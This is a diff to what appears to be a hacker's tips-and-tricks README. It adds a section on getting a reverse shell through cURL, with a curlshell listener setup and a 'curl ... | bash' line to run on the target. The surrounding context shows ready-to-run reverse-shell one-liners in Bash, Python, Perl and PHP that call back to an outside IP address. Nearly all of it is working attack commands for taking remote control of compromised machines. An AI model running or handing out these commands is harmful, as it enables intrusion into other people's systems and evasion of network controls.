@@ -49,6 +49,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Reverse Shells](#reverse-shell)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
+      2. [with cURL](#curlshell)
       1. [without Bash](#reverse-shell-no-bash)
       1. [with remote.moe](#revese-shell-remote-moe)
       1. [with Python](#reverse-shell-python)
@@ -1082,8 +1083,23 @@ bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 ```
 
+<a id="curlshell"></a>
+**5.i.c. Reverse shell with cURL**
+
+Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
+```sh
+# Generate SSL keys:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
+# Start your listening server:
+./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
+```
+```sh
+# On the target:
+curl -skfL https://1.2.3.4:8080 | bash
+```
+
 <a id="reverse-shell-no-bash"></a>
-**5.i.c. Reverse shell without Bash**
+**5.i.d. Reverse shell without Bash**
 
 Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -1114,7 +1130,7 @@ Note: Use */tmp/.fio* if */dev/shm* is not available.
 Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="revese-shell-remote-moe"></a>
-**5.i.d. Reverse shell with remote.moe and ssh**
+**5.i.e. Reverse shell with remote.moe and ssh**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
@@ -1141,13 +1157,13 @@ rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p &
 ```
 
 <a id="reverse-shell-python"></a>
-**5.i.e. Reverse shell with Python**
+**5.i.f. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.f. Reverse shell with Perl**
+**5.i.g. Reverse shell with Perl**
 
 ```sh
 # method 1
@@ -1156,7 +1172,7 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 <a id="reverse-shell-php"></a>
-**5.i.g. Reverse shell with PHP**
+**5.i.h. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
